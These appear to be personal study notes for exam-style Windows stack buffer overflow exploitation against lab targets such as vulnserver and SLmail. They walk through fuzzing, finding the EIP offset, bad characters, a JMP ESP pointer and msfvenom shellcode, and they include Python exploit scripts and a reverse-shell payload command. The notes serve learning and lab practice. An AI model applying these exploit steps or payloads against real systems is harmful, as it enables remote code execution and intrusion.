First of all enumerate the function of application via
`nc host port`
or
`telnet host port`

## Anatomy of memeory
|11111|Kernel|TOP(ESP)|
|--|--|--|
||Stack||
||Heap||
||Data||
|00000|Text||

<center><i>Stack grows towards lower memeory address</i></center>

Expected: Data should contained in buffer space i.e starting from ESP and ends on EBP and then EIP points to another instrction.

Unexpected: Data overflows out of EBP and goes to return address (EIP) so we can manipulate this reutrn address to our malicious payload.

<center><i>On x86 arch stack grows downwards toward lower addresses.</i></center>
	
4 bytes?

----


<center><b>CALL & RETN</b></center>

**CALL:** *Used to call other function or itself in case of recursive, intention of having CALLed function RETurn to next line of code in the calling function.*

**prologue:** *at the start of function performing setup in application of that function's execution.*
**epilogue:** *at the end of every function performing some tear-down of the fucntion before RETuring to the function from which it was CALLed.*


Breakpoints in Immunity?
by finding in IDA then use them in immunity?


**Example:**
• Function A() CALLs function B()
• Function B()’s prologue does some setup
• Function B()’s body does something useful
• Function B()’s epilogue does some tear-down and RETurns to function A()

---
**When CALL is executed:**
- It PUSHes the address of next instruction to the stack (so it can later be RETurned to by the  CALLed function)
- It modifies EIP so that execution jumps to the function being called.






## Methodology
1. Spiking - Method used to find vunlerable part of program 
2. Fuzzing - Send bunch of char to break it
3. Finding the offset - At what offset we break it 
4. Overwriting the EIP 
5. Finding bad characters
6. Finding the right module
7. Generating shellcode
8. Root

**Triggering the bug:**

1. By sending the bunch of A's in the program features if you see that EIP is overwritten then it is triggered.
```python
#!/usr/bin/env python2
import socket

# set up the IP and port we're connecting to
RHOST = "192.168.43.142"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
 # build a happy little message followed by a newline
buf = ""
buf += "A"*1024
buf += "\n"
 # send the happy little message down the socket
s.send(buf)
 # print out what we sent
print "Sent: {0}".format(buf)
 # receive some data from the socket
data = s.recv(1024)
 # print out what we received
print "Received: {0}".format(data)
```

*Now we need to find at what place those 4 byte A's exists which broke the program.*

***Note: How to test ?
Increase 1024 to 2x then so on***

**Discovering the offsets:**
For this one we going to use metasploit module to generate paylod to break the program.
`/usr/share/metasploit-framework/tools/pattern_create.rb`
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb`

So by the command `patten_create.rb -l 1024`. We will be able to make pattern from which we will identify the offset.

For this service we got `39654138`.

So lets convert hex into ascii `9eA8`

So lets find it in pattern_creater.rb output
`pattern_offset.rb -q 39654138` > 146

So this is the position of the 4 bytes that overwritten EIP.

At the same time 
ESP -  `Af0A` position 150
EIP -  	`9eA8` position 146

So as you see that there is a difference of 4bytes which makes sense as Saved return Pointer (EIP position) written by sprinf() and then later reutned to.

**When RET executed:**
- Takes the value at the top of the stack (where ESP points to ) and set carelessly it in EIP.
- Increments ESP by 4, so that it points at the next item "down" the stack.

EIP control:
```python

#!/usr/bin/env python2
import socket

# set up the IP and port we're connecting to
RHOST = "192.168.43.142"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
 # build a happy little message followed by a newline


#Validation of EIP 
buf_totlen = 1024
offset_srp = 146
# validation of EIP ends

buf = ""
buf += "A"*(offset_srp - len(buf)) # padding
buf += "BBBB" # SRP overwrite EIP
buf += "CCCC" # ESP should end up pointing here
buf += "D"*(buf_totlen - len(buf)) #trailing padding



buf += "\n"
 # send the happy little message down the socket
s.send(buf)
 # print out what we sent
print "Sent: {0}".format(buf)
 # receive some data from the socket
data = s.recv(1024)
 # print out what we received
print "Received: {0}".format(data)
```

==Need explaination Page:34,35==

EIP control is controling saved return pointer



So after sending / validating it by controling EIP we need to find the bad characters.

#### **Finding bad cahracters:**
TCM manual method:
- copy past all the bad characters in a file and then send them and then analyse it manually.


### Important about BadCharacters
----

We can see the bad characters are **"\x00\x07\x08\x2e\x2f\xa0\xa1"** but **not all of these** are bad chars. Occasionally bad chars cause the next byte to become corrupted or effect the rest of the string.

Because the idea is that the _next_ byte is the corrupted one, we can surmise that the invalid chars are "\x08\x2f\xa1" making **"\x00\x07\x2e\xa0"** the actual bad chars. As I said we can test for this manually (check B.O 9 below) and will return if these are not the actual bad chars
 #important 
 
 ----
 
 
 - First of all set working directory `!mona config -set workingfolder c:\Users\x3rz\Desktop\%p`
 1. Generate byte array withe `!mona bytearray -b '\x00'`
 2. Send the payload ans then compare the file bytearray.bin which made by above command.
 3. Compare with `!mona cmp -a esp -f bytearray.bin`
 4. Now try the above method #important
 5. Else start removing each bad character and see the difference and set accordingly.
6. Confirm the badchars by creating another bytearray `!mona bytearray -cpb '\x00\x3f'` then again repeat the steps if you see the `!mona cmp -a esp -f bytearray.bin` is unmodified then its correct no more bad chars 
	But if you see more badchars then it have more like in case of #overflow9 of oscp 
Always remember that a bad char kills the next byte.


```sh
What if i ommit \x00 and \x0a?
No only omit \x00
```

 
 
 
 




- generate a test string containing every possible byte from \\x00 ro \\xFF except for \\x00 and \\x0A.
- Write that string to a binary file.
- Put the string in to out payload in a convenient spot.
- Cause the program to crash

One such "convenient spot" at which to put the test string is the location at which we know ESP will be pointing to at the time of the crash.

So how we gonna identify the bad chars 
- As we made a dump that we sent in the program 
- We will use mona to compare dump we made and the hex dump of the program at which immunity breaks
- From that we will look for characters that are missing and those missing characters are bad characters.

Copy file to windows and then run mona command
`!mona cmp -a esp -f c:\Users\BOF\Desktop\bad.bin`


***Now we have bad characters and other assets but now what we need it that to enter a JMP instruction in EIP and that JMP will point towards our shell code.***


#### Why we cant direclty execute shell code after EIP?
Because ESP address changes at every execution you can test it yourself by sending payload 3 times and you will see 3 different values. So you cant predict the address of ESP.
**Explainiation:**
Current Initial state register values:

ESP: 0014E28C
EIP: 77922740

(Test 1) After Hello x3rz.

ESP: 0014FA84
EIP: 77922740

(Test 2) After Hello x3rz.

ESP: 0014FAE0
EIP: 77922740

So here we have same EIP and different ESP means EIP directs to same doreponse() function or next instruction for execution

Lets overflow the device 


ESP: 009319E4  as it contains CCCC
EIP: 42424242 as it contains BBBB

So here saved return points ie EIP is controlable but not ESP stack pointer 

So for getting our hands on Shell code execution we need to do one thing By the use of JMP ESP followed by our shellcode we can get our shell.

----

Now we know how to make shell code execute.

Lets find JMP ESP in our program 
`!mona jmp -r esp -cpb "\x00\x0A"`

-cpb -> to specify the bad characters that not to follow.

#### So in the case of finding jmp esp in module
There are few test cases to look for which will lead you to dll containing jmp esp. 
COMMAND: `!mona find -s "\xff\xe4" -m module.dll`
OMMIT BAD: `!mona find -s "\xff\xe4" -cpb "\x00\x0A\x0d" -m SLMFC.dll`
1. Check the almost all 'False' conditions(no protection i.e Means no ASLR, no Safe SEH) and dll that is in application directory. ex: c:\\Program/ Files\\vulnserver\\essfunc.dll
2. Check the dll files with the similar name to application ex: SLmail will have dll with name starting SLMFC.dll or so on with no ASLR, no Safe SEH


So it found two addresses
- 080414c3
- 080416bf

So we can overwrite the saved pointer with either of these addresses Then doresponse() tries to RETurn to the overwritten Saved Return Pointer, it will execute the "JMP ESP" instruction and divert execution flow to whatever data we send after the value that overwirtes the saved reutrn pointer.


**Little Endians:** 
• ASCII strings (e.g. "ABCD") are stored front-to-back: "\x41\x42\x43\x44\x00"
• Code (e.g. "NOP # NOP # NOP # RET") is stored front-to-back:
"\x90\x90\x90\xC3"
• Numbers (e.g. 0x1337) are stored back-to-front: "\x37\x13\x00\x00"
• Memory addresses or “pointers” (e.g. 0xDEADBEEF) are stored back-tofront:
"\xEF\xBE\xAD\xDE"


For sending our JMP ESP we will use the struct.pack() not the heath adams tought us the manual way cuz that causes problems and hard to do it.

So as we know we need to send the address of `JMP ESP` in little endian so we will write it back-to-front for manually doing then add the shellcode.

For the **struct.pack()** we will use struct madule for 32 bit arch and "<I" (little-endian, unsigned int) parameter.

> this method is without using NOP i.e via
>   using INT 3 ("\xCC") which caused software intrrupt pauses the execution as though hitting a breakpoint

---
**Pro tip:** *”INT 3” is actually how debuggers implement software breakpoints.
The debugger quietly replaces a single byte of the original program code at the
location of the breakpoint with ”INT 3” (\xCC) and then when the breakpoint
gets hit, it swaps the replaced byte out with what it originally was. The more you know!*

---
PRO TIP: As you sent 4 INT3 but there you seeing 3 INT3 and then do one thing that is scroll up and check if they are still 3 or now they are 2 INT3 but now if you see 2 then try appeneding Z  after EIP and before esp.
```python
buff = ""
buff += "A"*(offset_srp - len(buff)) # padding
buff += struct.pack("<I", ptr_jmp_esp) # SRP overwrite where EIP gets overwritten
# EIP says JMP ESP in little endian
buff += "Z"
buff += subtract_esp_10 # ESP points here 4 total intrrupts but now ESP moved to far away to Not getting crashed by GetPC from our payload.
# ESP subtracts it value and moves far away to avoid crash via GetPC but SUB ESP,0x10 is 16 which is and shoould be divisible by 4.

buff += shell_code
# Appened after ESP 4 Bytes which is executed and done

buff += "D"*(buf_totlen - len(buff)) # trailing padding
# Remaining part is padded via D

buff += "\n"
```

If still you see 2 then Increase the number of "Z" i.e buff += "ZZ" or "ZZZ" as per requirement.

Now check the Stack is written by INT3 intrrupt also you can see the address of ESP is `008F19E4` and the address out INT3 is place is `008F19E5` because at the address of ESP intrrupt is already exeuted and immunity doesnt show that to us but if you see at the disassembly section we can see "xxxx" .

**One more step towards the shell execution**
Inshort: INT3 caused the breakpoint automatically.

Lets create our shell now.
`msfvenom -p windows/exec -b '\x00\x0A' 
-f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread`

Reverse Shell:
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.139 LPORT=110 EXITFUNC=thread -v shell_code -f py -b "\x00\x0a\x0d"`


In metasploit code there is a thing called GetPC which is basically "Get the program counter/EIP" and to bypass this ppl use NOP which is No operation which they keep increasing untill their payload works.

**The right way** is by creating a assembly code as metasploit gives us a module to do that `metasm_shell.rb`
which give assebly instructions

We want to move the stack towards the lower addresses, so `SUB ESP, 0x10` will be "\x83\xec\x10"

This assembly code will drag ESP far enough up the stack.
**Note: It should not containe any bad characters.**

It is more beautiful way rather than just filling NOP's in until things work.

---
Whenever you muck with ESP by adding to it, subtracting from it, or outright changing it.
make sure that ESP you subtracting should be divisible by 4 as in this one 0x10 = 16 which is divisible by 4 and remains 4.
**ESP is naturally 4-byte aligned on x86 and you would do well to keep it that way.**

---

This is how you can execute commands on it.




## Important
In SLmail see once more the INT3 intrrupt problem that soreted out with adding Z after EIP.



## Registers

|Registers|Description|
|--|--|
|EAX||
|ECX||
|EDX||
|EBX||
|ESI||
|EDI||
|EBP(impt)||
|ESP(impt)||
|EIP(impt)||


